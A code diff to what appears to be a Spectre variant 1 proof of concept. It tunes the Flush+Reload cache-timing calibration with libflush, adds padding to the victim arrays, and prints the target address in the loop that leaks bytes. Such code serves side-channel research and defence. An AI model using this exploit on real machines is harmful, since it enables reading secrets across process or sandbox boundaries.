@@ -13,6 +13,7 @@ Victim code.
 uint8_t    ALIGN_CACHE array1[512];
 uint32_t   ALIGN_CACHE array1_size = sizeof(array1);
 uint8_t    ALIGN_CACHE array2[256 * 512];
+uint8_t    ALIGN_CACHE padding[1024];
 
 void victim_function(size_t x) {
   if (x < array1_size) {
@@ -25,45 +26,35 @@ Analysis code
 ********************************************************************/
 int find_cache_hit_threshold(libflush_session_t* libflush_session) {
     const int test_count = 32;
-    uint64_t hit_times[test_count];
-    uint64_t miss_times[test_count];
-//     uint64_t time_miss_min = -1; //MAX_LONG
+    int hit_times[test_count];
+    int miss_times[test_count];
 
 
     for (int i=0; i<test_count; i++) {
         libflush_flush(libflush_session, &array1_size);
         miss_times[i] = libflush_reload_address(libflush_session, &array1_size);
         hit_times[i] = libflush_reload_address(libflush_session, &array1_size);
-//         return (miss_times[i] + hit_times[i]) / 2;
-/*
-        if (time_miss < time_miss_min)
-            time_miss_min = time_miss;
-        if (time_hit > time_hit_max)
-            time_hit_max = time_hit;*/
-
-//         count++;
     }
 
     std::sort(hit_times, hit_times+test_count);
     std::sort(miss_times, miss_times+test_count);
-//     printf("Hit: %lu, Miss: %lu\n", time_hit_max, time_miss_min);
-//     return (time_hit_max + time_miss_min) / 2;
+
     printf("var hit_times = [");
-    for (int i=0; i<test_count; i++) {
+    for (int i=0; i<=10; i++) {
         if (i) printf(", ");
-        printf("%ld", hit_times[i]);
+        printf("%d", hit_times[i*(test_count-1) / 10]);
     }
     printf("];\n");
 
     printf("var miss_times = [");
-    for (int i=0; i<test_count; i++) {
+    for (int i=0; i<=10; i++) {
         if (i) printf(", ");
-        printf("%ld", miss_times[i]);
+        printf("%d", miss_times[i*(test_count-1) / 10]);
     }
     printf("];\n");
 
 
-    int threshold = (hit_times[(int)(0.9*(test_count-1))] + miss_times[(int)(0.1*(test_count-1))]) / 2;
+    int threshold = (hit_times[(int)(0.95*(test_count-1))] + miss_times[(int)(0.05*(test_count-1))]) / 2;
     printf("Cache threshold: %d\n", threshold);
     return threshold;
 }
@@ -160,7 +151,7 @@ int main(int argc, const char** argv) {
   int cache_threshold = find_cache_hit_threshold(libflush_session);
 
   memset(array2, 0, sizeof(array2));  /* write to array2 so in RAM not copy-on-write zero pages */
-  printf("Reading %d bytes:\n", target_len);
+  printf("Reading %d bytes at %p\n", target_len, target_ptr);
   while (target_len--) {
     uint8_t value[2];
     int score[2];
